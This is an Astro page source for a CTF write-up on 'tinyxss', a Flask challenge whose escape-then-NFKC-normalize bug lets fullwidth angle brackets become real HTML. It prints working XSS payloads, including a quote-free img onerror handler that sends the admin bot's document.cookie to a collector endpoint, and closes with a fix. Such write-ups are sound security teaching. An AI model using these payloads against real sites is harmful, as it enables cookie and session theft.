---
import Layout from "@/layouts/Layout.astro";
import Nav from "@/components/nav.astro";
---

<Layout title="tinyxss — CATF Writeup">
  <Nav />
  <main class="max-w-3xl mx-auto pt-28 md:pt-32 pb-16 text-[var(--white)]">
    <a
      href="/writeups/"
      class="inline-flex items-center gap-2 text-sm text-[var(--white-icon)] hover:text-white transition-colors mb-8"
    >
      <svg
        xmlns="http://www.w3.org/2000/svg"
        viewBox="0 0 24 24"
        fill="currentColor"
        class="size-4"
      >
        <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"
        ></path>
      </svg>
      Back to writeups
    </a>

    <header class="mb-10">
      <div class="flex flex-wrap items-center gap-3 mb-3 text-sm">
        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[var(--sec)]">
          CATF CTF
        </span>
        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[var(--white-icon)]">
          Web
        </span>
        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[#A9FF5B]">
          Easy
        </span>
        <span class="text-[var(--white-icon)]">Nov 2026</span>
      </div>
      <h1 class="text-4xl md:text-5xl font-semibold mb-3">tinyxss</h1>
      <p class="text-[var(--white-icon)]">
        Fullwidth Unicode vs. HTML escaping — a tiny XSS with a huge confidence
        problem.
      </p>
    </header>

    <figure class="mb-10">
      <img
        src="/images/tinyxss/cover.png"
        alt="tinyxss challenge landing page"
        class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
      />
    </figure>

    <article class="writeup space-y-5">
      <p>
        <strong>tinyxss</strong> is a small Flask challenge with an admin bot.
        The app promises that it HTML-encodes input and is therefore
        “completely invincible”. The bug is one line long: it escapes first,
        then applies Unicode NFKC normalization, which turns fullwidth angle
        brackets back into real HTML syntax after the escaping already ran.
      </p>
      <p>
        The admin bot stores the flag in a <code>flag</code> cookie without
        <code>HttpOnly</code>, so the final step is a normal cookie theft — sent
        to the challenge’s own collector because the bot cannot reach the
        internet.
      </p>

      <h2>TL;DR</h2>
      <p>
        Use <code>＜</code> (U+FF1C) and <code>＞</code> (U+FF1E) instead of
        <code>&lt;</code> and <code>&gt;</code>. MarkupSafe does not escape
        them; NFKC maps them to ASCII angle brackets <em>after</em> escaping.
        The quote-free payload below creates an
        <code>&lt;img&gt;</code> tag whose <code>onerror</code> redirects the
        admin browser to the local collector:
      </p>
      <pre><code>＜img src=x onerror=location=String.fromCharCode(47,99,111,108,108,101,99,116,47,...)+encodeURIComponent(document.cookie)＞</code></pre>
      <p>
        The full path is built with <code>String.fromCharCode()</code> so the
        payload needs no quotes and no slashes. The result:
      </p>
      <pre><code>flag=CATF&#123;test_flag_do_not_submit&#125;</code></pre>
      <p class="text-sm text-[var(--white-icon)]">
        Note: the provided archive does not ship the deployment’s
        <code>flag.env</code>, so this local reproduction shows the bot’s
        built-in test flag. The same chain reads the real flag on a live
        deployment.
      </p>

      <h2>Looking at the Source</h2>
      <p>
        The challenge gives us the application and the bot. The interesting
        function lives in <code>web/app.py</code>:
      </p>
      <pre><code>def vulnerable_render(user_input: str) -&gt; str:
    escaped = str(escape(user_input))
    return unicodedata.normalize("NFKC", escaped)</code></pre>
      <p>
        The order is the vulnerability:
      </p>
      <ul class="list-disc list-inside space-y-1">
        <li><strong>1.</strong> HTML-escape the input.</li>
        <li><strong>2.</strong> Normalize the <em>escaped</em> string with NFKC.</li>
        <li><strong>3.</strong> Insert the result into the page as HTML.</li>
      </ul>
      <p>
        The index route reflects the input in two places. The value of the
        search box is escaped normally, but the result section uses
        <code>vulnerable_render()</code>. There is no CSP, so a successfully
        injected handler runs.
      </p>

      <h2>The Bug: Fullwidth Angle Brackets</h2>
      <p>
        MarkupSafe’s <code>escape()</code> replaces <code>&amp;</code>,
        <code>&lt;</code>, <code>&gt;</code>, <code>"</code> and
        <code>'</code>. It knows nothing about Unicode lookalikes. NFKC,
        however, performs compatibility normalization — and the fullwidth
        forms are compatibility characters:
      </p>
      <pre><code>U+FF1C  ＜   -&gt;  &lt;
U+FF1E  ＞   -&gt;  &gt;</code></pre>
      <p>So the pipeline behaves like this:</p>
      <pre><code>input     : ＜img src=x onerror=...＞
escape()  : ＜img src=x onerror=...＞   (unchanged)
NFKC      : &lt;img src=x onerror=...&gt;   (real tag)
browser   : creates an img element and fires onerror</code></pre>
      <p>
        That is the entire trick: the escaping routine runs before the
        transformation that recreates the characters it was supposed to
        neutralize.
      </p>
      <p>
        One consequence matters for the payload: quotes are escaped to
        <code>&amp;quot;</code> and <code>&amp;#39;</code>, and NFKC does not
        turn those back. Any quoted JavaScript inside an attribute therefore
        becomes inert. The payload must be quote-free.
      </p>

      <h2>Step 1 — Create an Inbox</h2>
      <p>
        The challenge ships its own collector, which is exactly what we need
        because the admin bot is attached only to an internal Docker network.
        Open <code>/report</code> and click <strong>Create inbox</strong>.
      </p>
      <figure>
        <img
          src="/images/tinyxss/report-page.png"
          alt="Tiny Admin report page with a created inbox"
          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
        />
        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
          Creating an inbox gives us <code>/collect/&lt;id&gt;</code>.
        </figcaption>
      </figure>
      <p>
        The page shows the collector URL for the new inbox. We will send the
        admin’s cookie to that path.
      </p>

      <h2>Step 2 — Confirm the Injection</h2>
      <p>
        Before stealing anything, it is worth proving that the reflection is
        real HTML and that JavaScript executes. This payload injects a heading
        and turns the page background red with an unquoted handler:
      </p>
      <pre><code>＜h2 style=color:red＞XSS confirmed＜/h2＞＜img src=x onerror=document.body.style.backgroundColor=String.fromCharCode(114,101,100)＞</code></pre>
      <p>
        Put it in the <code>q</code> parameter (URL-encoded) and load the page:
      </p>
      <pre><code>/?q=%EF%BC%9Ch2%20style%3Dcolor%3Ared%EF%BC%9EXSS%20confirmed%EF%BC%9C%2Fh2%EF%BC%9E...</code></pre>
      <figure>
        <img
          src="/images/tinyxss/xss-proof.png"
          alt="Injected heading and red background proving XSS"
          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
        />
        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
          The heading and the red background both come from the injected
          payload.
        </figcaption>
      </figure>
      <p>
        The broken image icon is the <code>&lt;img&gt;</code> tag, and the red
        background is <code>onerror</code> executing. No quotes were needed:
        <code>style=color:red</code> is a valid unquoted attribute, and
        <code>String.fromCharCode(114,101,100)</code> builds the string
        <code>"red"</code> at runtime.
      </p>

      <h2>Step 3 — Build the Exfiltration Payload</h2>
      <p>
        The bot creates a fresh browser context and adds the flag as a
        JavaScript-readable cookie for the challenge origin:
      </p>
      <pre><code>name: 'flag', value: FLAG, httpOnly: false, sameSite: 'Lax'</code></pre>
      <p>
        Because the bot only visits URLs on the same origin and has no internet
        access, the payload must exfiltrate to the local collector. The target
        path is:
      </p>
      <pre><code>/collect/&lt;inbox_id&gt;?d=</code></pre>
      <p>
        We need to navigate there and append <code>document.cookie</code>.
        Quotes are unavailable, so the path is encoded as character codes and
        the cookie is URL-encoded:
      </p>
      <pre><code>location=String.fromCharCode(47,99,111,108,108,101,99,116,47,...)+encodeURIComponent(document.cookie)</code></pre>
      <p>
        The complete payload used in the screenshots is:
      </p>
      <pre><code>＜img src=x onerror=location=String.fromCharCode(47,99,111,108,108,101,99,116,47,87,79,72,84,97,117,106,45,110,77,111,63,100,61)+encodeURIComponent(document.cookie)＞</code></pre>
      <p>
        <code>String.fromCharCode()</code> avoids quotes, slashes and
        percent-signs inside the handler.
        <code>encodeURIComponent()</code> keeps cookie values safe if they
        contain characters such as <code>+</code>, <code>&amp;</code> or
        <code>#</code>.
      </p>
      <div class="rounded-xl border border-[var(--white-icon-tr)] bg-[#1414149c] p-4 text-sm">
        <strong>Gotcha:</strong> when the payload is placed in a query string,
        the <code>+</code> in <code>+encodeURIComponent(...)</code> must be
        percent-encoded as <code>%2B</code>. Otherwise Flask decodes it to a
        space, the unquoted attribute ends early, and the handler breaks.
      </div>

      <h2>Step 4 — Report It to Tiny Admin</h2>
      <p>
        Paste the URL-encoded local URL into the report form and submit it. The
        bot resolves relative URLs against the challenge origin, opens the page
        in a new context with the flag cookie, and waits one second:
      </p>
      <pre><code>/?q=%EF%BC%9Cimg%20src%3Dx%20onerror%3Dlocation%3DString.fromCharCode(...)%2BencodeURIComponent(document.cookie)%EF%BC%9E</code></pre>
      <figure>
        <img
          src="/images/tinyxss/report-sent.png"
          alt="Report accepted by the admin bot"
          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
        />
        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
          Tiny Admin visited the reported URL.
        </figcaption>
      </figure>
      <p>
        The injected <code>&lt;img&gt;</code> fails to load immediately, so
        <code>onerror</code> runs well inside the one-second window. The
        handler sets <code>location</code> to the collector and appends the
        cookie:
      </p>
      <pre><code>GET /collect/&lt;inbox_id&gt;?d=flag%3DCATF%7B...%7D HTTP/1.1</code></pre>

      <h2>Step 5 — Read the Inbox</h2>
      <p>
        Open <code>/inbox/&lt;inbox_id&gt;</code>. The collector stored the
        query parameter, and the inbox renders it:
      </p>
      <figure>
        <img
          src="/images/tinyxss/inbox-flag.png"
          alt="Inbox showing the stolen flag cookie"
          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
        />
        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
          The admin bot’s cookie arrived in the local inbox.
        </figcaption>
      </figure>
      <p>
        That is the flag cookie. On the live deployment the value is the real
        <code>CATF&#123;...&#125;</code> flag; in this local reproduction the
        bot falls back to its built-in test value because no
        <code>flag.env</code> was supplied.
      </p>

      <h2>Why It Works</h2>
      <ul class="list-disc list-inside space-y-1">
        <li><strong>Wrong order:</strong> escaping runs before NFKC, so normalization can reintroduce HTML metacharacters.</li>
        <li><strong>Unicode lookalikes:</strong> <code>＜</code>/<code>＞</code> are ignored by MarkupSafe but normalized to <code>&lt;</code>/<code>&gt;</code>.</li>
        <li><strong>Quote-free JS:</strong> <code>String.fromCharCode()</code> builds paths and strings without quotes, which would be escaped.</li>
        <li><strong>Readable cookie:</strong> the bot stores the flag with <code>httpOnly: false</code>, so <code>document.cookie</code> exposes it.</li>
        <li><strong>Same-origin collector:</strong> the bot has no internet, but it can reach the challenge’s own <code>/collect</code> endpoint.</li>
        <li><strong>Immediate trigger:</strong> a broken <code>&lt;img&gt;</code> fires <code>onerror</code> without user interaction, inside the bot’s one-second wait.</li>
      </ul>

      <h2>Fix</h2>
      <p>
        Normalize first, then escape. Escaping must be the last transformation
        before the value reaches HTML:
      </p>
      <pre><code>def safe_render(user_input: str) -&gt; str:
    normalized = unicodedata.normalize("NFKC", user_input)
    return str(escape(normalized))</code></pre>
      <p>
        Even better, stop building HTML with string replacement. Use a
        context-aware template engine (Jinja2 autoescaping) and pass the
        reflected value as data, so the escaping happens at render time in the
        correct context. Additional hardening for the bot:
      </p>
      <ul class="list-disc list-inside space-y-1">
        <li>Mark the flag cookie <code>HttpOnly</code> so JavaScript cannot read it.</li>
        <li>Add a restrictive Content Security Policy as defense in depth.</li>
        <li>Do not normalize values after escaping — any post-escape transformation invalidates the escaping guarantee.</li>
      </ul>

      <h2>Final Thoughts</h2>
      <p>
        This is a great example of why “we HTML-escape everything” is not a
        complete answer. The escape was correct; the pipeline around it was
        not. A single normalization call after escaping was enough to turn a
        harmless-looking fullwidth character into a working XSS.
      </p>
      <p>Thanks for the read! 🐛</p>
    </article>

    <div class="mt-12 pt-8 border-t border-[#ffffff10] flex justify-between items-center">
      <a
        href="/writeups/"
        class="inline-flex items-center gap-2 text-sm text-[var(--white-icon)] hover:text-white transition-colors"
      >
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="size-4">
          <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"></path>
        </svg>
        Back to writeups
      </a>
    </div>
  </main>
</Layout>

<style>
  .writeup {
    font-size: 1.05rem;
    line-height: 1.8;
    color: var(--white);
  }

  .writeup h2 {
    font-size: 1.75rem;
    font-weight: 600;
    color: var(--white);
    padding-top: 1.5rem;
  }

  .writeup strong {
    color: #fff;
  }

  .writeup code {
    background: #1414149c;
    border: 1px solid var(--white-icon-tr);
    border-radius: 0.4rem;
    padding: 0.1rem 0.4rem;
    font-size: 0.85em;
    color: var(--sec);
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    word-break: break-all;
  }

  .writeup pre {
    background: #1414149c;
    border: 1px solid var(--white-icon-tr);
    border-radius: 1rem;
    padding: 1rem 1.25rem;
    overflow-x: auto;
  }

  .writeup pre code {
    background: none;
    border: none;
    padding: 0;
    color: #dfdfdf;
    font-size: 0.9rem;
    line-height: 1.7;
    white-space: pre-wrap;
    overflow-wrap: anywhere;
  }

  .writeup figure img {
    display: block;
  }
</style>
